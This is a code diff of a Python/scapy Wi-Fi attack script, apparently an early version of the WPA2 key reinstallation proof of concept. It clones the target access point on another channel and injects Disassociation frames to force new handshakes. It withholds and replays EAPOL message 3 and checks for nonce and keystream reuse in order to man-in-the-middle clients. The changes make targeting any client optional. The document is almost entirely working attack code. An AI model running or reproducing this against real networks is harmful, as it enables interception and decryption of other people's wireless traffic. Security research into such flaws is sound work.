@@ -102,8 +102,9 @@ def dot11_to_str(p):
 		else:                        return repr(p)
 	return repr(p)
 
-def print_rx(level, name, p):
-	log(level, "%s: %s -> %s: %s" % (name, p.addr2, p.addr1, dot11_to_str(p)), color="orange" if Dot11Deauth in p else None)
+def print_rx(level, name, p, color=None):
+	if color is None and Dot11Deauth in p: color="orange"
+	log(level, "%s: %s -> %s: %s" % (name, p.addr2, p.addr1, dot11_to_str(p)), color=color)
 
 def construct_csa():
 	switch_mode = 1		# STA should not Tx untill switch is completed
@@ -139,12 +140,14 @@ def get_tlv_value(p, type):
 class ClientState():
 	def __init__(self, macaddr):
 		self.macaddr = macaddr
+		self.reset()
 
+	def reset(self):
 		self.is_mitmed = False
 		self.previv = None
 		self.prevkeystream = None
 		self.msg3s = []
-		self.msg4 = None
+		#self.msg4 = None
 
 
 class DejaVuAttack():
@@ -169,43 +172,8 @@ class DejaVuAttack():
 		self.beacon = p[0][Dot11]
 		self.apmac = self.beacon.addr2
 
-	def intercept_sentby_client(self, p, client):
-		if client and not client.is_mitmed: return None
-
-		eapolnum = get_eapol_msgnum(p)
-		if eapolnum == 4:
-			client.msg4 = p
-			log(STATUS, "Not forwarding EAPOL msg4 (TODO: Track reception?)", color="green")
-			return None
-		if Dot11WEP in p:
-			# scapy incorrectly puts Extended IV into wepdata field, so skip those bytes				
-			plaintext = "\xaa\xaa\x03\x00\x00\x00\x88\x8e"
-			encrypted = p[Dot11WEP].wepdata[4:4+len(plaintext)]
-			keystream = xorstr(plaintext, encrypted)
-
-			iv = dot11_get_iv(p)
-			if client.previv == iv:
-				log(STATUS, "Nonce reuse detected (IV=%d)!" % iv, color="green", showtime=False)
-
-				if keystream != client.prevkeystream:
-					# TODO: Don't send this frame for the subsequent IV reuses in this attack session!!
-					log(STATUS, "Client likely installed all-zero key, now directly MitM'ing", color="green", showtime=False)
-
-					log(STATUS, "Forwarding Msg4 to rogue AP to fully accept client", color="green", showtime=False)
-					send_dot11(self.sock_rogue, client.msg4)
-
-					client.forward = False
-				
-				else:
-					log(STATUS, "Normal Key Reinstallation Attack, finishing handshake at AP side", color="green", showtime=False)
-					send_dot11(self.sock_real, client.msg4)
-
-			client.previv = iv
-			client.prevkeystream = keystream
-		return p
-
 	def intercept_sentby_ap(self, p, client=None):
-		if client and not client.is_mitmed: return None
+		if client and not client.is_mitmed: return
 
 		eapolnum = get_eapol_msgnum(p)
 		if not client is None and eapolnum == 3:
@@ -218,66 +186,99 @@ class DejaVuAttack():
 				log(STATUS, "Got 3rd EAPOL msg3, will now forward all three msg3's", color="green", showtime=False)
 			else:
 				log(STATUS, "Not forwarding EAPOL msg3 (%d now queued)" % len(client.msg3s), color="green", showtime=False)
-			return None
-		return p
+			return
+		
+		if p.addr1 != "ff:ff:ff:ff:ff:ff":
+			send_dot11(self.sock_rogue, p)
 
 	def handle_rx_realchan(self):
 		p = recv_dot11(self.sock_real)
 		if p == None: return
 
+		# TODO: When a failed MitM is detected, queue a CSA beacon and Disassociation
 
-		# 1. Track wether the client is directly sending to the AP on the real channel
-		client = self.clients.get(p.addr2)
-		if client and p.addr1 == self.apmac:
+		# 1a. Track wether the targeted client is directly sending to the AP on the real channel
+		if self.clientmac is not None and self.clientmac == p.addr2 and p.addr1 == self.apmac:
 			print_rx(INFO, "Real channel ", p)
 			if Dot11Auth in p:
-				log(WARNING, "Client %s is connecting to the AP on the real channel. MitM failed." % client.macaddr)
-				client.is_mitmed = False
+				log(WARNING, "Client %s is connecting to the AP on the real channel. MitM failed." % self.clientmac)
+				if p.addr2 in self.clients: self.clients[p.addr2].reset()
+		# 1b. And display all other frames it is sending or receiving
+		elif self.clientmac is not None and (self.clientmac in [p.addr1, p.addr2]) and (self.apmac in [p.addr1, p.addr2]):
+			print_rx(INFO, "Real channel ", p)
+		# 1c. Display other clients that are trying to authenticate on the real channel
+		elif p.addr1 == self.apmac and Dot11Auth in p:
+			print_rx(INFO, "Real channel ", p, color="orange")
+			if p.addr2 in self.clients: self.clients[p.addr2].reset()
 
-		# 2. Now focus on data send by the real AP to a client we are MitM'ing or want to target
+		# 3. Now focus on data send by the real AP to a client we are MitM'ing or want to target
 		if p.addr2 != self.apmac: return
-		# FIXME: We are currently not forwarding beacon. Is this what we want? Or more simple hostapd?
 		if Dot11Beacon in p: print_rx(DEBUG, "Real channel ", p)
+		if not p.addr1 in self.clients: return
 
-		client = self.clients.get(p.addr1)
-		if client is None: return
+		# Frames sent by the targeted client is already displayed, so display all others
+		if p.addr1 != self.clientmac: print_rx(INFO, "Real channel ", p)
 
-		print_rx(INFO, "Real channel ", p)
-		forward = self.intercept_sentby_ap(p, client)
-		if forward is not None and p.addr1 != "ff:ff:ff:ff:ff:ff":
-			send_dot11(self.sock_rogue, forward)
+		self.intercept_sentby_ap(p, self.clients[p.addr1])
 
 	def handle_rx_roguechan(self):
 		p = recv_dot11(self.sock_rogue)
 		if p == None: return
 
-		# 1. Handle frames sent by the rogue AP to the client
-		client = self.clients.get(p.addr1)
-		if client: print_rx(INFO, "Rogue channel", p)
+		# 1. Display frames sent by the rouge AP to the targeted client or MitM'ed client (and then ignore them)
+		if (p.addr1 == self.clientmac or p.addr1 in self.clients) and p.addr2 == self.apmac:
+			print_rx(INFO, "Rouge channel", p)
+			return
 
-		# 2. Handle frames sent by a client we want to target or are MitM'ing
-		client = self.clients.get(p.addr2)
-		if client is None: return
+		# 2. Check if it's a new client that we can MitM
+		if p.addr1 == self.apmac and Dot11Auth in p:
+			log(STATUS, "Successfully MitM'ed client %s" % p.addr2, color="green")
+			self.clients[p.addr2] = ClientState(p.addr2)
+			self.clients[p.addr2].is_mitmed = True
+
+		# 3. Now focus on data send by a MitM'ed client towards the AP
+		if not p.addr2 in self.clients: return
+		if p.addr1 != self.apmac: return
+		
+		client = self.clients[p.addr2]
+		if not client.is_mitmed: return None
 
 		print_rx(INFO, "Rogue channel", p)
-		if Dot11Auth in p:
-			log(STATUS, "Successfully MitM'ed client %s" % client.macaddr, color="green")
-			client.is_mitmed = True
 
-		# TODO: The intercept functions can forward frames themselves??
-		forward = self.intercept_sentby_client(p, client)
-		if forward is not None: send_dot11(self.sock_real, forward)
+		# 4. We block and store Msg4 to forward it when the attack is done -- FIXME encrypted Msg4's and forwarded anyway...??
+		#eapolnum = get_eapol_msgnum(p)
+		#if eapolnum == 4:
+		#	client.msg4 = p
+		#	log(STATUS, "Not forwarding EAPOL msg4 (TODO: Track reception?)", color="green")
+		#	return
 
-	def handle_frames(self):
-		i = 0
-		while True:
-			sel = select([self.sock_rogue, self.sock_real], [], [])
+		# 5. Use encrypted frames to determine if the key reinstallation attack succeeded
+		if Dot11WEP in p:
+			# Note that scapy incorrectly puts Extended IV into wepdata field, so skip those four bytes				
+			plaintext = "\xaa\xaa\x03\x00\x00\x00\x88\x8e"
+			encrypted = p[Dot11WEP].wepdata[4:4+len(plaintext)]
+			keystream = xorstr(plaintext, encrypted)
 
-			if self.sock_real in sel[0]:
-				self.handle_rx_realchan()
+			iv = dot11_get_iv(p)
+			if client.previv == iv:
+				# If the same keystream is reused, we have a normal key reinstallation attack
+				if keystream == client.prevkeystream:
+					log(STATUS, "SUCCESS! Nonce and keystream reuse detected (IV=%d)." % iv, color="green", showtime=False)
 
-			if self.sock_rogue in sel[0]:
-				self.handle_rx_roguechan()
+				# Otherwise the client likely installed a new key, i.e., probably an all-zero key
+				else:
+					log(STATUS, "SUCCESS! Nonce reuse, with likely use of all-zero key.")
+					log(STATUS, "Now directly MitM'ing using rogue AP ...", color="green", showtime=False)
+					log(STATUS, "!!! TODO !!! Forwarding Msg4 to rogue AP to fully accept client", color="green", showtime=False)
+
+					# The client is now no longer MitM'ed by this script (i.e. no frames forwarded between channels)
+					client.is_mitmed = False
+
+			client.previv = iv
+			client.prevkeystream = keystream
+
+		send_dot11(self.sock_real, p)
+
 
 	def run(self):
 		# Make sure to use a recent backports driver package so we can indeed
@@ -285,7 +286,7 @@ class DejaVuAttack():
 		self.sock_real  = conf.L2socket(type=ETH_P_ALL, iface=self.nic_real)
 		self.sock_rogue = conf.L2socket(type=ETH_P_ALL, iface=self.nic_rogue)
 
-		# Test monitor mode and get MAC address of the network
+		# Test monitor mode and get MAC address of the network -- FIXME: we can also attack any network its connected to
 		self.find_beacon(self.ssid)
 		log(STATUS, "Target network detected: " + self.apmac, color="green")
 
@@ -296,15 +297,18 @@ class DejaVuAttack():
 
 		# Let the victim switch, then inject a Disassociation frame to trigger a new handshake
 		time.sleep(2)
-		p = Dot11(addr1=self.clientmac, addr2=self.apmac, addr3=self.apmac)/Dot11Disas(reason=0)
-		send_dot11(self.sock_rogue, p)
-		log(STATUS, "Injected Disassociation", color="green")
-
-		# Only attack the specific client that was listed
-		self.clients[self.clientmac] = ClientState(self.clientmac)
+		if self.clientmac is None:
+			log(STATUS, "No target client given: cannot inject Disassociation to force new handshake")
+		else:
+			p = Dot11(addr1=self.clientmac, addr2=self.apmac, addr3=self.apmac)/Dot11Disas(reason=0)
+			send_dot11(self.sock_rogue, p)
+			log(STATUS, "Injected Disassociation to %s" % self.clientmac, color="green")
 
 		# Continue attack by monitoring both channels and performing needed actions
-		self.handle_frames()
+		while True:
+			sel = select([self.sock_rogue, self.sock_real], [], [])
+			if self.sock_real  in sel[0]: self.handle_rx_realchan()
+			if self.sock_rogue in sel[0]: self.handle_rx_roguechan()
 
 
 if __name__ == "__main__":
@@ -312,7 +316,7 @@ if __name__ == "__main__":
 	parser.add_argument('nic_real_ap', help='Wireless monitor interface that will listen on the channel of the target AP.')
 	parser.add_argument('nic_rogue_ap', help='Wireless monitor interface that will listen on the channel of the rogue (cloned) AP.')
 	parser.add_argument('ssid', help='The SSID of the network to attack.')
-	parser.add_argument('clientmac', help='The MAC address of the client that will be attacked.')
+	parser.add_argument('--clientmac', help='Only attack clients with the given MAC adress.')
 	args = parser.parse_args()
 
 	dejavu = DejaVuAttack(args.nic_real_ap, args.nic_rogue_ap, args.ssid, args.clientmac)
